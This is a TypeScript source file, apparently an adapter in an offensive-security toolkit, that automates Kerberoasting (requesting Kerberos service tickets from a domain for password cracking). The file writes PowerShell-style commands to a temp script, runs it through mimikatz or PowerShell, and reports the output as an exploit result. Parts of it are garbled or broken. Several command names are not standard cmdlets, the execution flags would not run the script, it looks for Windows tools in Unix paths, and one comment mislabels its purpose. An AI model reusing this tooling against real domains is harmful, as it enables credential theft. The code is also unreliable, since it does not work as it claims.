/**
 * OffSec by True Hacking — Adapter: Kerberoast.
 *
 * Kerberos ticket extraction (Kerberoasting).
 * See: https://github.com/morluto/rea/blob/main/src/adapter/
 */

import { spawnSync } from "node:child_process";
import { tmpdir } from "node:os";
import { writeFileSync } from "node:fs";
import { randomUUID } from "node:crypto";

import type { ExploitResult, Provenance } from "../domain/analysisResultProjection.js";

/**
 * Kerberoasting (Kerberos ticket extraction).
 *
 * @param options - Kerberoasting options (domain, target, kdc).
 */
export function kerberoast(options: {
  domain?: string;
  target?: string;
  kdc?: string;
  options?: Record<string, string>;
}): ExploitResult {
  const domain = options.domain || "";
  const target = options.target || "";

  // Build the results (kerberoast).
  const results: Record<string, any> = {};

  // Kerberoast (run mimikatz or custom script).
  const kerbPath = findBinary("mimikatz") || findBinary("powershell");
  if (kerbPath) {
    const commands = [
      `Get-DomainUser -Domain ${domain}`,  // (PowerShell: Get-ADUser).
      `Get-UserSPNs -Domain ${domain} -Request`,  // (PowerShell: Request SPN).
      `Invoke-UserHarvest -Domain ${domain} -Request`,  // (PowerShell: Harvest).
    ];
    const file = `${tmpdir()}/${randomUUID()}.kerb.ps1`;
    writeFileSync(file, commands.join("\n"));

    // Execute (PowerShell or mimikatz).
    const child = spawnSync(kerbPath, ["-c", file], { timeout: 300000, maxBuffer: 1024 * 1024 });
    results.kerberoast = String(child.stdout ?? "");
  } else {
    results.kerberoast = `{stub: no mimikatz or PowerShell (install: apt install mimikatz or use PowerShell).}`;
  }

  return {
    target,
    payload: `kerberoast/${domain}`,
    success: Object.keys(results).length > 0,
    output: JSON.stringify(results),
    provenance: createProvenance("kerberoast", `kerberoast://${domain}`),
  };
}

/** Find the binary (mimikatz/powershell). */
function findBinary(name: string): string | undefined {
  const candidates = [
    "/usr/local/bin/" + name,
    "/usr/bin/" + name,
    "/opt/homebrew/bin/" + name,
  ];
  for (const path of candidates) {
    try {
      require("node:fs").accessSync(path);
      return path;
    } catch {
      // Skip.
    }
  }
  return undefined;
}

/** Create a PCAP result (provenance). */
function createProvenance(type: string, path: string): Provenance {
  return {
    id: `${type}://${path}`,
    type,
    path,
    label: "",
    verified: true,
    sensitive: path.includes("password") || path.includes("credential"),
  };
}
